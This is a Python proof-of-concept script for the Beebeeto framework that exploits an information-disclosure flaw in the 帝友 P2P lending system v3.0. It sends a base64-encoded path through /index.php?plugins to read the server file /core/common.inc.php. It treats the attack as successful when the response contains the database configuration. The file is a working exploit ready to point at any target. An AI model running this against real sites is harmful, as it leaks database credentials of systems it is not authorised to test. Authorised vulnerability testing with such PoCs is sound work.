#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0055',
            'name': '帝友P2P借贷系统 v3.0 /index.php?plugins 信息泄露漏洞 POC',
            'author': 'xiangshou',
            'create_date': '2015-03-08',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': '帝友P2P借贷系统',
            'vul_version': ['3.0'],
            'type': 'Information Disclosure',
            'tag': ['帝友P2P借贷系统漏洞', '敏感信息泄漏', '/index.php?plugins', 'php'],
            'desc': '漏洞文件：/index.php',
            'references': ['http://wooyun.org/bugs/wooyun-2010-033114',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = '/index.php?plugins&q=imgurl&url=QGltZ3VybEAvY29yZS9jb21tb24uaW5jLnBocA=='
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if 'common.inc.php' in content and '$db_config' in content:
            args['success'] = True
            args['poc_ret']['vul_url']= verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())